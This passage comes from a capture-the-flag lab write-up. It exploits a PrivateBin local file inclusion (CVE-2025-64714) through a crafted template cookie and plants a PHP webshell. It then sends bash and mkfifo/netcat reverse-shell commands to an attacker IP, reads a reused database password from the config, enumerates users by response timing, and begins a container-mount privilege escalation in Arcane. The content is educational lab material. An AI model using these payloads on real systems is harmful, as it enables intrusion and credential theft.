+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/privatebin-data$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> data/
+<span class="go">total 44
+drwxrwxrwx 7 root   operator 4096 Jul 21 21:33 .
+drwxrwx--- 5 root   operator 4096 Mar 15 21:23 ..
+drwx------ 3 nobody       82 4096 Mar 15 21:23 12
+drwx------ 3 nobody       82 4096 Jul 21 21:33 77
+drwx------ 3 nobody       82 4096 Jul 21 21:27 93
+drwxrwxrwx 3 root   operator 4096 Mar 15 21:23 bd
+drwx------ 3 root   operator 4096 Mar 15 21:23 e3
+-rwxrwxrwx 1 root   operator   19 Feb 16 08:29 .htaccess
+-rwxrwxrwx 1 root   operator   47 Jul 21 21:33 purge_limiter.php
+-rwxrwxrwx 1 root   operator  522 Feb 16 08:29 salt.php
+-rw-r----- 1 root   operator  132 Feb 16 08:34 traffic_limiter.php
+</span></code></pre></div></div>
+
+<p>The directories named with two hex digits are PrivateBin’s stored pastes. Most aren’t accessible to ben, and the ones that are hold nothing useful.</p>
+
+<p>There’s a <code class="language-plaintext highlighter-rouge">docker-proxy</code> process running that is directing localhost port 8080 to 172.17.0.2 port 8080:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/etc/nginx/sites-enabled$</span><span class="w"> </span>ps auxww | <span class="nb">grep</span> <span class="nt">-i</span> docker
+<span class="go">root        1675  0.0  1.8 1972104 75044 ?       Ssl  Jul21   0:27 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root        2019  0.0  0.1 2040412 5756 ?        Sl   Jul21   0:55 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080 -use-listen-fd
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/privatebin</code> shows that that container must be PrivateBin on <code class="language-plaintext highlighter-rouge">bin.kobold.htb</code>:</p>
+
+<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">server</span> <span class="p">{</span>
+    <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
+    <span class="kn">server_name</span> <span class="s">bin.kobold.htb</span><span class="p">;</span>
+    <span class="kn">return</span> <span class="mi">301</span> <span class="s">https://bin.kobold.htb</span><span class="nv">$request_uri</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">server</span> <span class="p">{</span>
+    <span class="kn">listen</span> <span class="mi">443</span> <span class="s">ssl</span><span class="p">;</span>
+    <span class="kn">server_name</span> <span class="s">bin.kobold.htb</span><span class="p">;</span>
+
+    <span class="kn">ssl_certificate</span> <span class="n">/privatebin-data/certs/cert.pem</span><span class="p">;</span>
+    <span class="kn">ssl_certificate_key</span> <span class="n">/privatebin-data/certs/key.pem</span><span class="p">;</span>
+
+    <span class="kn">access_log</span> <span class="n">/var/log/nginx/privatebin_access.log</span> <span class="s">combined</span><span class="p">;</span>
+    <span class="kn">error_log</span> <span class="n">/var/log/nginx/privatebin_error.log</span><span class="p">;</span>
+
+    <span class="kn">location</span> <span class="n">/</span> <span class="p">{</span>
+        <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:8080</span><span class="p">;</span>
+        <span class="kn">proxy_set_header</span> <span class="s">Host</span> <span class="nv">$host</span><span class="p">;</span>
+        <span class="kn">proxy_set_header</span> <span class="s">X-Real-IP</span> <span class="nv">$remote_addr</span><span class="p">;</span>
+        <span class="kn">proxy_set_header</span> <span class="s">X-Forwarded-For</span> <span class="nv">$proxy_add_x_forwarded_for</span><span class="p">;</span>
+        <span class="kn">proxy_set_header</span> <span class="s">X-Forwarded-Proto</span> <span class="nv">$scheme</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="cve-2025-64714">CVE-2025-64714</h3>
+
+<h4 id="background">Background</h4>
+
+<p>Searching for “privatebin 2.0.2 cve” finds multiple references to CVE-2025-62796:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722083915220.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722083915220.png" alt="image-20260722083915220" class="include_image " />
+</picture>
+
+<p>This vulnerability was introduced in version 1.7.7 and patched in 2.0.2. So that’s not what I’m looking for. I think it’s coming up because all of the advisories have 2.0.2 in their text. If I use the NOT operator (on Brave search, or just -cve-2025-62796 on Google), it removes those results and a new CVE jumps out:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722084759747.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722084759747.png" alt="image-20260722084759747" class="include_image " />
+</picture>
+
+<p>NIST describes <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64714">CVE-2025-64714</a> as:</p>
+
+<blockquote>
+  <p>PrivateBin is an online pastebin where the server has zero knowledge of pasted data. Starting in version 1.7.7 and prior to version 2.0.3, an unauthenticated Local File Inclusion exists in the template-switching feature. If <code class="language-plaintext highlighter-rouge">templateselection</code> is enabled in the configuration, the server trusts the <code class="language-plaintext highlighter-rouge">template</code> cookie and includes the referenced PHP file. An attacker can read sensitive data or, if they manage to drop a PHP file elsewhere, gain remote code execution. The constructed path of the template file is checked for existence, then included. For PrivateBin project files this does not leak any secrets due to data files being created with PHP code that prevents execution, but if a configuration file without that line got created or the visitor figures out the relative path to a PHP script that directly performs an action without appropriate privilege checking, those might execute or leak information. The issue has been patched in version 2.0.3. As a workaround, set <code class="language-plaintext highlighter-rouge">templateselection = false</code> (which is the default) in <code class="language-plaintext highlighter-rouge">cfg/conf.php</code> or remove it entirely</p>
+</blockquote>
+
+<p>It’s a local file include (LFI) that is patched in version 2.0.3. This <a href="https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82">GitHub advisory</a> has a nice writeup of the vulnerability as well as ways to check if <code class="language-plaintext highlighter-rouge">templateselection</code> is enabled on a specific host.</p>
+
+<p>The issue here is that the code allows for template setting via a cookie, and starting in 1.7.7 this cookie is accepted with minimal validation. Full details of the vulnerable code are in the advisory.</p>
+
+<h4 id="check-templateselection">Check templateselection</h4>
+
+<p>For an instance of PrivateBin to be vulnerable to this CVE, it must have <code class="language-plaintext highlighter-rouge">templateselection</code> enabled in the configuration, which is not enabled by default. I already noticed that <code class="language-plaintext highlighter-rouge">cfg</code> is not accessible to check. That said, when I look at the page there is a theme dropdown:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722090616696.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722090616696.png" alt="image-20260722090616696" class="include_image " />
+</picture>
+
+<p>When I change that theme it updates in the cookie <code class="language-plaintext highlighter-rouge">template</code> in the next request to <code class="language-plaintext highlighter-rouge">/</code>:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">bin.kobold.htb</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">template=bootstrap-compact-page; ph_phc_dTOPniyUNU2kD8Jx8yHMXSqiZHM8I91uWopTMX6EBE9_posthog=%7B%22%24device_id%22%3A%22019f881a-09d8-78ff-8344-b9d0f5b26cd9%22%2C%22distinct_id%22%3A%22019f881a-09d8-78ff-8344-b9d0f5b26cd9%22%2C%22%24sesid%22%3A%5B1784749501064%2C%22019f8b21-5f06-7e66-b228-6ac9a2c38cac%22%2C1784745647878%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmcp.kobold.htb%2F%22%7D%7D</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">document</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">none</span>
+<span class="na">Sec-Fetch-User</span><span class="p">:</span> <span class="s">?1</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0, i</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+</code></pre></div></div>
+
+<p>The presence of this template dropdown is itself a good sign, since PrivateBin only exposes it when <code class="language-plaintext highlighter-rouge">templateselection</code> is enabled, which is the exact setting this CVE requires. The CVE is abused by modifying that cookie.</p>
+
+<h4 id="simple-vulnerability-test">Simple Vulnerability Test</h4>
+
+<p>In the “Reproduction Steps” of the advisory, it says to check for this vulnerability with a <code class="language-plaintext highlighter-rouge">curl</code> command that will return 500 if it is vulnerable. I’ll update the command a bit, removing <code class="language-plaintext highlighter-rouge">--silent</code> so that I can see errors, adding <code class="language-plaintext highlighter-rouge">-k</code> to ignore the fact that the TLS certificate is not properly signed, and <code class="language-plaintext highlighter-rouge">-I</code> to just see the resulting headers.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> <span class="nt">-I</span> <span class="nt">--cookie</span> <span class="s1">'template=../cfg/conf'</span> https://bin.kobold.htb
+<span class="go">HTTP/1.1 500 Internal Server Error
+Server: nginx/1.24.0 (Ubuntu)
+Date: Wed, 22 Jul 2026 13:10:06 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Cache-Control: no-store, no-cache, no-transform, must-revalidate
+Pragma: no-cache
+Expires: Wed, 22 Jul 2026 13:10:06 GMT
+Last-Modified: Wed, 22 Jul 2026 13:10:06 GMT
+Vary: Accept
+Content-Security-Policy: default-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'self'; connect-src * blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; font-src 'self'; frame-ancestors 'none'; frame-src blob:; img-src 'self' data: blob:; media-src blob:; object-src blob:; sandbox allow-same-origin allow-scripts allow-forms allow-modals allow-downloads
+Cross-Origin-Resource-Policy: same-origin
+Cross-Origin-Embedder-Policy: require-corp
+Permissions-Policy: browsing-topics=()
+Referrer-Policy: no-referrer
+X-Content-Type-Options: nosniff
+X-Frame-Options: deny
+X-XSS-Protection: 1; mode=block
+Set-Cookie: template=..%2Fcfg%2Fconf; secure; SameSite=Lax
+</span></code></pre></div></div>
+
+<p>It’s a 500, which means it’s vulnerable. A patched server would ignore the manipulated <code class="language-plaintext highlighter-rouge">template</code> cookie and return a normal 200. This one instead resolves the path and includes <code class="language-plaintext highlighter-rouge">cfg/conf.php</code>. That file isn’t a valid template, so including it throws a PHP fatal error, and that error is what produces the 500, which is proof that the inclusion happened.</p>
+
+<h4 id="poc-1">POC</h4>
+
+<p>The reason this vulnerability isn’t a bigger deal is because to run arbitrary code, I’d need to get that onto the filesystem first. When looking for remote code execution, that would mean some kind of file write vulnerability to write a <code class="language-plaintext highlighter-rouge">.php</code> file (since the include appends <code class="language-plaintext highlighter-rouge">.php</code>). The template value is treated as a path relative to PrivateBin’s templates directory, so the leading <code class="language-plaintext highlighter-rouge">../</code> steps out of that directory to reach siblings like <code class="language-plaintext highlighter-rouge">cfg</code> and <code class="language-plaintext highlighter-rouge">data</code>.</p>
+
+<p>In this case, I have access to the host. The <code class="language-plaintext highlighter-rouge">data</code> directory is world-writable, so as ben I can drop files into it. I’m also going to assume that directory is mounted into the Docker container based on the files in it. I’ll write a file:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/privatebin-data/data$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"0xdf was here"</span> <span class="o">&gt;</span> test.php
+</code></pre></div></div>
+
+<p>And I can read it using the LFI vulnerability:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/test'</span> https://bin.kobold.htb
+<span class="go">0xdf was here
+</span></code></pre></div></div>
+
+<p>To check for code execution, I’ll write some dummy PHP:</p>
+
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/privatebin-data/data$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"&lt;?php echo '0xdf executed this'; ?&gt;"</span> <span class="o">&gt;</span> test2.php
+</code></pre></div></div>
+
+<p>When I include this, it executes and prints the echoed string:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/test2'</span> https://bin.kobold.htb
+<span class="go">0xdf executed this
+</span></code></pre></div></div>
+
+<p>That is code execution!</p>
+
+<h4 id="shell-1">Shell</h4>
+
+<p>I’ll create a file with a simple PHP webshell:</p>
+
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:/privatebin-data/data$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</span> <span class="o">&gt;</span> 0xdf.php
+<span class="gp">ben@kobold:/privatebin-data/data$</span><span class="w"> </span><span class="nb">cat </span>0xdf.php 
+<span class="go">&lt;?php system($_REQUEST["cmd"]); ?&gt;
+</span></code></pre></div></div>
+
+<p>Now I can execute commands:</p>
+
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/?cmd=id'</span>
+<span class="go">uid=65534(nobody) gid=82(www-data) groups=82(www-data)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-k</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">--data</span> <span class="s1">'cmd=id'</span>
+<span class="go">uid=65534(nobody) gid=82(www-data) groups=82(www-data)
+</span></code></pre></div></div>
+
+<p>A troubleshooting note worth mentioning: the PrivateBin container runs PHP with OPcache and <code class="language-plaintext highlighter-rouge">opcache.validate_timestamps=0</code>. That means once a <code class="language-plaintext highlighter-rouge">.php</code> file is included, its compiled bytecode is cached and later changes to the file on disk are ignored. So if I want to change a file after including it (for example if it didn’t work due to some issue on my part), I’ll have to write to a new filename each time (unless I have a way to reset OPcache or restart the container). I lost some real time on this before figuring it out.</p>
+
+<p>To get a full shell, I’ll replace <code class="language-plaintext highlighter-rouge">id</code> with a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--data-urlencode</span> <span class="s1">'cmd=bash -c "bash -i &gt;%26 /dev/tcp/10.10.15.217/443 0&gt;%261"'</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">-k</span>
+</code></pre></div></div>
+
+<p>Sending this didn’t work. That’s because <code class="language-plaintext highlighter-rouge">bash</code> isn’t installed:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--data-urlencode</span> <span class="s1">'cmd=which bash'</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">-k</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--data-urlencode</span> <span class="s1">'cmd=which curl'</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">-k</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--data-urlencode</span> <span class="s1">'cmd=which wget'</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">-k</span>
+<span class="go">/usr/bin/wget
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--data-urlencode</span> <span class="s1">'cmd=which nc'</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">-k</span>
+<span class="go">/usr/bin/nc
+</span></code></pre></div></div>
+
+<p>It’s Alpine Linux, which is a very minimal distribution:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--data-urlencode</span> <span class="s1">'cmd=cat /etc/os-release'</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">-k</span>
+<span class="go">NAME="Alpine Linux"
+ID=alpine
+VERSION_ID=3.22.2
+PRETTY_NAME="Alpine Linux v3.22"
+HOME_URL="https://alpinelinux.org/"
+BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
+</span></code></pre></div></div>
+
+<p>However, <code class="language-plaintext highlighter-rouge">nc</code> has the <code class="language-plaintext highlighter-rouge">-e</code> option:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--data-urlencode</span> <span class="s1">'cmd=nc -h 2&gt;&amp;1'</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">-k</span>
+<span class="go">nc: unrecognized option: h
+BusyBox v1.37.0 (2025-08-05 16:40:33 UTC) multi-call binary.
+
+Usage: nc [OPTIONS] HOST PORT  - connect
+nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen
+
+        -e PROG Run PROG after connect (must be last)
+        -l      Listen mode, for inbound connects
+        -lk     With -e, provides persistent server
+        -p PORT Local port
+        -s ADDR Local address
+        -w SEC  Timeout for connects and final net reads
+        -i SEC  Delay interval for lines sent
+        -n      Don't do DNS resolution
+        -u      UDP mode
+        -b      Allow broadcasts
+        -v      Verbose
+        -o FILE Hex dump traffic
+        -z      Zero-I/O mode (scanning)
+</span></code></pre></div></div>
+
+<p>I could just use that, but I don’t love the promptless shell it returns and getting a full PTY from there is tricky on this terminal, so I’ll use a <code class="language-plaintext highlighter-rouge">mkfifo</code> shell:</p>
+
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--data-urlencode</span> <span class="s1">'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.217 443 &gt;/tmp/f'</span> <span class="nt">--cookie</span> <span class="s1">'template=../data/0xdf'</span> <span class="s1">'https://bin.kobold.htb/'</span> <span class="nt">-k</span>
+</code></pre></div></div>
+
+<p>And there’s a connection:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.245.50 45075
+sh: can't access tty; job control turned off
+</span><span class="gp">/var/www $</span><span class="w"> </span><span class="nb">id</span> 
+<span class="go">uid=65534(nobody) gid=82(www-data) groups=82(www-data)
+</span></code></pre></div></div>
+
+<h2 id="shell-as-root">Shell as root</h2>
+
+<h3 id="enumeration-1">Enumeration</h3>
+
+<h4 id="container">Container</h4>
+
+<p>The container is very bare. There are no users with home directories. I’ll find the directories from the host mounted in <code class="language-plaintext highlighter-rouge">/srv</code>, along with some others:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/srv $ </span><span class="nb">ls</span>
+<span class="go">bin
+cfg
+data
+lib
+tpl
+vendor
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/srv/data</code> matches the host:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/srv $ </span><span class="nb">ls </span>data
+<span class="go">0xdf.php
+12
+77
+93
+bd
+cmd.php
+diag.php
+diag2.php
+e3
+oc.php
+purge_limiter.php
+salt.php
+shell.php
+test.php
+test2.php
+traffic_limiter.php
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">cfg</code> just has <code class="language-plaintext highlighter-rouge">conf.php</code>. This is the config directory ben couldn’t read on the host, but from within the container it is readable:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/srv/cfg $ </span><span class="nb">ls</span>
+<span class="go">conf.php
+</span></code></pre></div></div>
+
+<p>The config is quite long, so I’ll grab the uncommented lines:</p>
+
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">/srv/cfg $ </span><span class="nb">cat </span>conf.php | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^;'</span> | <span class="nb">grep</span> <span class="nb">.</span>
+<span class="go">[main]
+discussion = true
+opendiscussion = false
+password = true
+fileupload = false
+burnafterreadingselected = false
+defaultformatter = "plaintext"
+sizelimit = 10000000
+templateselection = true
+availabletemplates[] = "bootstrap5"
+availabletemplates[] = "bootstrap"
+availabletemplates[] = "bootstrap-page"
+availabletemplates[] = "bootstrap-dark"
+availabletemplates[] = "bootstrap-dark-page"
+availabletemplates[] = "bootstrap-compact"
+availabletemplates[] = "bootstrap-compact-page"
+languageselection = false
+[expire]
+default = "1week"
+[expire_options]
+5min = 300
+10min = 600
+1hour = 3600
+1day = 86400
+1week = 604800
+1month = 2592000
+1year = 31536000
+never = 0
+[formatter_options]
+plaintext = "Plain Text"
+syntaxhighlighting = "Source Code"
+markdown = "Markdown"
+[traffic]
+limit = 10
+[purge]
+limit = 300
+batchsize = 10
+[model]
+class = Filesystem
+[model_options]
+dir = PATH "data"
+[main]
+discussion = true
+opendiscussion = false
+password = true
+fileupload = false
+burnafterreadingselected = false
+defaultformatter = "plaintext"
+sizelimit = 10000000
+templateselection = true
+availabletemplates[] = "bootstrap5"
+availabletemplates[] = "bootstrap"
+availabletemplates[] = "bootstrap-page"
+availabletemplates[] = "bootstrap-dark"
+availabletemplates[] = "bootstrap-dark-page"
+availabletemplates[] = "bootstrap-compact"
+availabletemplates[] = "bootstrap-compact-page"
+languageselection = false
+[expire]
+default = "1week"
+[expire_options]
+5min = 300
+10min = 600
+1hour = 3600
+1day = 86400
+1week = 604800
+1month = 2592000
+1year = 31536000
+never = 0
+[formatter_options]
+plaintext = "Plain Text"
+syntaxhighlighting = "Source Code"
+markdown = "Markdown"
+[traffic]
+limit = 10
+[purge]
+limit = 300
+batchsize = 10
+[model]
+class = Filesystem
+[model_options]
+dir = PATH "data"
+[model]
+[model_options]
+dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
+tbl = "privatebin_"    ; table prefix
+usr = "privatebin"
+pwd = "ComplexP@sswordAdmin1928"
+opt[12] = true   ; PDO::ATTR_PERSISTENT
+</span></code></pre></div></div>
+
+<p>This is where <code class="language-plaintext highlighter-rouge">templateselection</code> is enabled:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">templateselection</span> <span class="o">=</span> <span class="kc">true</span>
+<span class="n">availabletemplates</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"bootstrap5"</span>
+<span class="n">availabletemplates</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"bootstrap"</span>
+<span class="n">availabletemplates</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"bootstrap-page"</span>
+<span class="n">availabletemplates</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"bootstrap-dark"</span>
+<span class="n">availabletemplates</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"bootstrap-dark-page"</span>
+<span class="n">availabletemplates</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"bootstrap-compact"</span>
+<span class="n">availabletemplates</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"bootstrap-compact-page"</span>
+</code></pre></div></div>
+
+<p>More interesting is the user and password at the bottom:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">model_options</span><span class="p">]</span>
+<span class="n">dsn</span> <span class="o">=</span> <span class="s2">"mysql:host=localhost;dbname=privatebin;charset=UTF8"</span>
+<span class="n">tbl</span> <span class="o">=</span> <span class="s2">"privatebin_"</span>    <span class="p">;</span> <span class="n">table</span> <span class="n">prefix</span>
+<span class="n">usr</span> <span class="o">=</span> <span class="s2">"privatebin"</span>
+<span class="n">pwd</span> <span class="o">=</span> <span class="s2">"ComplexP@sswordAdmin1928"</span>
+<span class="n">opt</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span>   <span class="p">;</span> <span class="no">PDO</span><span class="o">::</span><span class="no">ATTR_PERSISTENT</span>
+</code></pre></div></div>
+
+<p>I’ll try this password with root and alice, but it doesn’t work.</p>
+
+<h4 id="arcane-authenticated-access">Arcane Authenticated Access</h4>
+
+<p>The <a href="https://getarcane.app/docs/setup/installation#6-open-arcane">Arcane docs</a> show the default creds for Arcane are arcane / arcane-admin:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722101945591.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722101945591.png" alt="image-20260722101945591" /><em>Click for full size image</em></a></p>
+
+<p>The default creds don’t work, but I can use request time to enumerate users. A non-existing user takes about 1 second to respond:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260727163052398.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260727163052398.png" alt="image-20260727163052398" class="include_image " />
+</picture>
+
+<p>admin takes about the same:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260727163119250.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260727163119250.png" alt="image-20260727163119250" class="include_image " />
+</picture>
+
+<p>However, arcane takes reliably more than 100ms more:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260727163207806.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260727163207806.png" alt="image-20260727163207806" class="include_image " />
+</picture>
+
+<p>That suggests arcane is a valid name and the other two aren’t. I’ll try the password from the PrivateBin instance, “ComplexP@sswordAdmin1928” does work:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722102415904.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722102415904.png" alt="image-20260722102415904" /><em>Click for full size image</em></a></p>
+
+<p>There’s one container in use, the PrivateBin one. There is another image, <code class="language-plaintext highlighter-rouge">mysql</code>, that isn’t in use.</p>
+
+<h3 id="container-abuse">Container Abuse</h3>
+
+<p>Being able to control containers is always a privesc risk. I’ll click on “Containers” from the menu and select “Create Container” from the dots at the top right:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722102703360.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722102703360.png" alt="image-20260722102703360" /><em>Click for full size image</em></a></p>
+
+<p>On the resulting page, I’ll fill out the info, using the <code class="language-plaintext highlighter-rouge">mysql</code> image already on the box:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722104552813.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722104552813.png" alt="image-20260722104552813" /><em>Click for full size image</em></a></p>
+
+<p>Before hitting “Create Container”, I’ll visit the “Volumes”, and add the root filesystem as a mount inside the container:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722104836271.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722104836271.png" alt="image-20260722104836271" /><em>Click for full size image</em></a></p>
+
